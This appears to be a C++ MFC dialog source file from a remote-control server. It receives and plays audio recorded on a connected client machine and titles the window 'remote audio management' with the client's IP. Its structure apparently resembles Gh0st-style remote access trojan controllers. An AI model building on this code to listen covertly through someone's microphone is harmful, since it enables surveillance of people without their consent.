// DlgAudioManager.cpp : 实现文件
//

#include "stdafx.h"
#include "Server.h"
#include "DlgAudioManager.h"
#include "afxdialogex.h"


// CDlgAudioManager 对话框

IMPLEMENT_DYNAMIC(CDlgAudioManager, CDialog)

CDlgAudioManager::CDlgAudioManager(CWnd* pParent, _CIOCPServer* IOCPServer,
	PCONTEXT_OBJECT  ContextObject)
	: CDialog(IDD_DIALOG_AUDIO_MANAGER, pParent)
{
	m_IOCPServer = IOCPServer;
	m_ContextObject = ContextObject;
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDR_MAINFRAME));
}

CDlgAudioManager::~CDlgAudioManager()
{
}

void CDlgAudioManager::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(CDlgAudioManager, CDialog)
	ON_WM_CLOSE()
END_MESSAGE_MAP()


// CDlgAudioManager 消息处理程序


BOOL CDlgAudioManager::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO:  在此添加额外的初始化
	SetIcon(m_hIcon, FALSE);

	//将客户端IP显示在标题栏
	CString v1;
	sockaddr_in  ClientAddress;
	memset(&ClientAddress, 0, sizeof(ClientAddress));
	int  ClientAddressLength = sizeof(ClientAddress);
	//得到连接的IP地址
	BOOL IsOk = getpeername(m_ContextObject->ClientSocket, (SOCKADDR*)&ClientAddress, &ClientAddressLength);
	v1.Format("\\\\%s - 远程音频管理", IsOk != INVALID_SOCKET ? inet_ntoa(ClientAddress.sin_addr) : "");
	//设置对话框标题
	SetWindowText(v1);

	BYTE  IsToken = CLIENT_GO_ON;
	m_IOCPServer->OnPreSending(m_ContextObject, &IsToken, 1);
	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}


void CDlgAudioManager::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	m_ContextObject->DialogHandle = NULL;
	m_ContextObject->DialogID = 0;
	CancelIo((HANDLE)m_ContextObject->ClientSocket);
	closesocket(m_ContextObject->ClientSocket);
	CDialog::OnClose();
}
void  CDlgAudioManager::WindowHandleIO(void)
{
	if (m_ContextObject == NULL)
	{
		return;
	}
	switch (m_ContextObject->m_ReceivedDecompressedBufferData.GetArray(0)[0])
	{
	case  CLIENT_AUDIO_MANAGER_DATA:
	{
		m_Audio.PlayRecordData(m_ContextObject->m_ReceivedDecompressedBufferData.GetArray(1),
			m_ContextObject->m_ReceivedDecompressedBufferData.GetArrayLength() - 1);
		break;
	}
	default:
		break;
	}
}